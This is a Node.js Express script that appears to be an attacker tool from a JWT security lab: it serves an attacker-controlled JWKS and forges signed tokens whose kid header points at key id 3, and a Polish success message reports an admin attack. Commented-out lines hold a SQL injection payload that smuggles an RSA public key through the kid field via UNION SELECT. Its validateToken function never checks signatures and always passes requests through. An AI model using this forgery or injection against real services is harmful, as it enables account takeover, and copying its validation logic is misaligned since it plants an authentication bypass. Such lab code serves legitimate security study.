const Express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const jose = require('node-jose');
const jwktopem = require('jwk-to-pem')
const axios = require('axios')
const app = new Express();
var sqlite3 = require('sqlite3');
app.use(Express.json())
let db1 = new sqlite3.Database('vuln_api.db');
let publicKeys = []
const result = db1.get("SELECT pem FROM keys where id = 3");
console.log(result)
  db1.each("SELECT pem FROM keys where id = 3", function(err, row) {
    publicKeys.push(row)
  });
  console.log(publicKeys)

// define the payload


app.get('/jwks', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    
    res.send(keyStore.toJSON())
  })
  app.get('/tokens', async (req, res) => {
    const ks = fs.readFileSync('attacker_keys.json')
    const keyStore = await jose.JWK.asKeyStore(ks.toString())
    const [key] = keyStore.all({ use: 'sig' })
    
    const opt = { compact: true, jwk: key, fields: { typ: 'jwt', kid: "3" } }
    const payload = JSON.stringify({
      exp: Math.floor((Date.now() + 24*60*60*1000) / 1000),
      iat: Math.floor(Date.now() / 1000),
      sub: 'test',

    })
    let token = await jose.JWS.createSign(opt, key)
      .update(payload)
      .final()
    token = token.toString('base64')
    res.send({ token})
  })
  app.get('/verify', validateToken, async (req, res) => {
    res.send("atak jako localhost:5002 / admin udany")
  })

  async function validateToken(req, res, next) {
    const token = req.body.token
    var decoded = jwt.decode(token);
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString())
    console.log(header)
    console.log(decoded.header)
    //publicKey  = db.get("SELECT pem FROM keys where id= "+header.kid)
    let publicKeys = []
    const result = db.get("SELECT pem FROM keys where id = 3");
    console.log(result)
      await db.each("SELECT pem FROM keys where id = 3", function(err, row) {
        publicKeys.push(row)
      });
      //if (token == null) res.sendStatus(400).send("Token not present")
     // console.log(publicKeys)
     // const key = await jose.JWK.asKey(publicKey);
     // const verifier = jose.JWS.createVerify(key);
     // const v = await verifier.verify(token);
     // console.log(v.header)
     // console.log(v.payload.toString())
      //header.kid = `0 UNION SELECT \'-----BEGIN RSA PUBLIC KEY-----
     //MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
      //-----END RSA PUBLIC KEY-----\'`
      //console.log("SELECT id, pem FROM keys where id= "+header.kid)
      //db.each("SELECT pem FROM keys where id= "+header.kid, function(err, row) {
       // console.log(row);
      //});

      //const{ data} = await axios.get("http://localhost:5001/jwks")
    
    next() 
    


} 

  app.listen(5001, () => console.log('server started :5001'))